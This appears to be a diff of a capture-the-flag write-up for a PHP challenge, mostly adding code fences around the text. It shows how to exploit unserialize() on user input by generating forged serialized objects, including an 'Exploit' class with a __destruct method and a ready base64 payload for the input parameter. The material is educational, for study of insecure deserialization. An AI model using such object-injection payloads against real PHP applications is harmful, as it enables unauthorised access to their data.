@@ -1,7 +1,7 @@
 #### First thing first: this is the php code, read it in raw
 
 
-
+ ```
 <?php
 class Object 
 { 
@@ -76,7 +76,7 @@ if(isset($_GET['is_debug']) && $_GET['is_debug']==='1')
    show_source(__FILE__);
 }
 ?>
-
+ ```
 ### The important part is unserialize(base64_decode($_GET['input']));
 
 ### In The HTML, There will be 2 input: one is to serialize and the other is to unserilize it
@@ -85,7 +85,7 @@ if(isset($_GET['is_debug']) && $_GET['is_debug']==='1')
 
 - The second method would be create another serialize object outside **(fake object)** and make $obj->enter == $obj->jackpot
 
-
+ ```
 <?php
 class Objects {
 	var $jackpot;
@@ -98,7 +98,7 @@ class Objects {
 $input = new Objects();
 echo base64_encode(serialize($input));
 ?>
-
+ ```
 ### Some other way:
 1. elegura.wolfe (english) (fake object way): https://advancedpersistentjest.com/2017/07/17/writeup-tsulott-meepwn/
 2. clayday (english) (reference way): http://blog.clayday.id/tsulott-meepwn-ctf-2017-writeup/
@@ -107,41 +107,41 @@ echo base64_encode(serialize($input));
 
 #### 1.Fake object:
 - An “object” class is also defined in the source code:
-
+ ```
 class Object 
 { 
  var $jackpot;
  var $enter; 
 }
-
+ ```
 - The path to explotiation lies in creating a fake object, called something else (not “Object”, which seems to cause PHP to use it’s own class definition), which passes the “$obj->enter === $obj->jackpot” check, but doesn’t allow $obj->jackpot to be overwritten. Helpfully, PHP allows us to define “protected” properties, which cannot be modified, as per below:
-
+ ```
 class Test{
  protected $_data = array(
  "jackpot" => "12345"
  );
  var $enter;
 }
-
+ ```
 #### 3. Cool way:
+ ```
+$ php -a
+Interactive mode enabled
 
-- $ php -a
-- Interactive mode enabled
+php > class Exploit
+php > {
+php {	function __destruct ()
+php {	{
+php {		var_dump ($flag);
+php {	}
+php { }
+php > echo base64_encode (serialize (new Exploit ()));
+PHP Notice:  Undefined variable: flag in php shell code on line 5
+NULL
+Tzo3OiJFeHBsb2l0IjowOnt9
 
-- php > class Exploit
-- php > {
-- php {	function __destruct ()
-- php {	{
-- php {		var_dump ($flag);
-- php {	}
-- php { }
-- php > echo base64_encode (serialize (new Exploit ()));
-- PHP Notice:  Undefined variable: flag in php shell code on line 5
-- NULL
-- Tzo3OiJFeHBsb2l0IjowOnt9
-
-- When we request /?input=Tzo3OiJFeHBsb2l0IjowOnt9, we get the flag:
-
+When we request /?input=Tzo3OiJFeHBsb2l0IjowOnt9, we get the flag:
+ ```
 
 #### 4.Just create a object, NULL is cool:
 Our only chance is generate a completely random object and encoded with base64.
